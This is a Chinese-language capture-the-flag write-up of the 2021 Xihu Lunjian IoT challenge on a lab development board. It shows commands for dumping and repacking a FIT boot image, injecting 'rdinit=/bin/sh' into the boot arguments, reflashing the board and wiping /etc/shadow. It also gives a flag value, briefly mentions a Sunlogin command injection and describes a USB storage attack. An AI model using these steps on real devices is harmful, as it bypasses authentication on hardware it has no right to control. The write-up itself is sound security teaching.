---
title: 2021 西湖论剑 IOT RW WriteUp
contest: 2021 西湖论剑 IOT (海特实验室)
year: 2021
difficulty: hard
vuln_type: [pwn_unknown, auth_bypass, rce, web_unknown, reverse]
tags: [IoT, ARM924EJS, AVR, FIT-Image, dfu-util, dumpimage, dtc, sunloginclient, mqtt, mosquitto_pub, Allwinner, Linux-Embedded, USB-Hacker]
attack_chain: ["海特实验室开发板：ARM924EJS (Linux IoT) + AVR (单片机)", "OTG → 网口；UART 115200 串口；TF 卡 hsqs 文件加载赛题", "dfu-util -l 看到 5 分区: rom/kernel/env/u-boot/all", "dfu-util -R -a kernel -U kernel.itb 导出 FIT Image", "dumpimage -l 看 3 个子镜像: kernel / initrd / fdt", "dtc -I dtb -O dts fdt.dtb 改 bootargs 加 rdinit=/bin/sh", "改 dts → 打包回 itb → dfu-util -D 刷回开发板", "/bin/sh → 抹 /etc/shadow → /sbin/init → 完整 shell", "MQTT 题目: mosquitto_pub -t 2022/hatlab/flag -m 'oiU7m9ipyqFdzkUFb1vfkabZ7IqiAefslrc3ovql2dA='", "向日葵 sunloginclient 11.0.0.36662 命令注入（CVE 复现）", "USB Hacker: 把板子改造成 USB Mass storage 攻击目标硬件"]
key_payload: "bootargs = \"console=ttyS0,115200 rdinit=/bin/sh\""
one_liner: 2021 西湖论剑 IoT RW：FIT Image dts 注入 + dfu 刷回 + MQTT 协议 + USB 设备模拟
lesson: FIT Image 是嵌入式 Linux 启动标准；dfu-util 是 IoT 调试必备；MQTT 协议是 IoT 通讯主流
quality: high
---

# 2021 西湖论剑 IOT RW WriteUp

原文 https://www.ctfiot.com/30841.html （海特实验室）

## 简介
- 海特实验室自研开发板
- ARM924EJS + AVR 双架构
- USB OTG + UART 115200 + TF 卡 hsqs 文件
- 板载：USB / 摄像头 / 蓝牙 / 显示屏 / 充电电池

## 攻击链

### Step 1: dfu-util 拿分区
```bash
$ dfu-util -l
Found DFU: [1f3a:1010] ver=0215, devnum=100, cfg=1, intf=0, path="3-6", alt=4, name="rom"
Found DFU: [1f3a:1010] ver=0215, devnum=100, cfg=1, intf=0, path="3-6", alt=3, name="kernel"
Found DFU: [1f3a:1010] ver=0215, devnum=100, cfg=1, intf=0, path="3-6", alt=2, name="env"
Found DFU: [1f3a:1010] ver=0215, devnum=100, cfg=1, intf=0, path="3-6", alt=1, name="u-boot"
Found DFU: [1f3a:1010] ver=0215, devnum=100, cfg=1, intf=0, path="3-6", alt=0, name="all"

$ dfu-util -R -a kernel -U kernel.itb
```

### Step 2: dumpimage 拆 FIT Image
```bash
$ dumpimage -l kernel.itb
FIT description: Generic Allwinner FIT Image
  Image 0 (kernel-1): Linux kernel
  Image 1 (initrd-1): Linux initrd
  Image 2 (fdt-1): Flattened Device Tree blob

$ dumpimage -l kernel.itb -p 0 -o kernel_1
$ dumpimage -l kernel.itb -p 1 -o initrd_1
$ dumpimage -l kernel.itb -p 2 -o fdt.dtb
```

### Step 3: dts 注入 rdinit
```bash
$ dtc -I dtb -O dts fdt.dtb > fdt.dts
# 改 chosen.bootargs = "console=ttyS0,115200 rdinit=/bin/sh";
$ dtc -I dts -O dtb fdt.dts > fdt.dtb
```

### Step 4: 重新打包
```bash
$ cat > kernel.its <<EOF
/dts-v1/;
/ {
    description = "Generic Allwinner FIT Image";
    #address-cells = <1>;
    images {
        kernel-1 { description = "Linux kernel"; data = /incbin/("kernel_1"); type = "kernel"; ... }
        initrd-1 { description = "Linux initrd"; data = /incbin/("initrd_1"); type = "ramdisk"; ... }
        fdt-1 { description = "Flattened Device Tree blob"; data = /incbin/("fdt.dtb"); type = "flat_dt"; ... }
    };
    configurations {
        default = "conf-1";
        conf-1 { description = "Linux Bootable FIT"; kernel = "kernel-1"; fdt = "fdt-1"; ramdisk = "initrd-1"; }
    };
};
EOF

$ mkimage -f kernel.its kernel.itb
$ dfu-util -R -a kernel -D kernel.itb
```

### Step 5: getshell
```bash
# 启动开发板 → /bin/sh
# 抹掉 /etc/shadow 密码
# /sbin/init → 完整 shell
```

## 各题

### MQTT
```bash
$ mosquitto_pub -t 2022/hatlab/flag -h IP -m "oiU7m9ipyqFdzkUFb1vfkabZ7IqiAefslrc3ovql2dA="
```

### 向日葵 sunloginclient CVE
- 11.0.0.36662 旧版本
- `sub_BFDC50` 路径 `/projection` 命令注入
- 加载 deb 包到 IDA 还原利用链

### USB Hacker
- 板子 OTG 改造成 USB Mass Storage
- 攻击目标硬件

## 教学价值
- **FIT Image** 是嵌入式 Linux 启动标准（ARM/Allwinner）
- **dfu-util** 是 IoT 调试必备
- **dumpimage** (u-boot 工具) 拆 FIT
- **dtc** Device Tree Compiler
- **MQTT** 是 IoT 通讯协议
- **USB HID/Mass Storage 攻击** 是物理渗透
- **向日葵 sunloginclient CVE** 是工控漏洞案例

## 工具
- dfu-util
- dumpimage (u-boot)
- dtc
- mkimage (u-boot)
- IDA Pro
- mosquitto_pub / sub

## 关联
- 西湖论剑是浙江省 / 安恒办的
- IoT + 车联网 + 嵌入式安全 = 蓝海方向
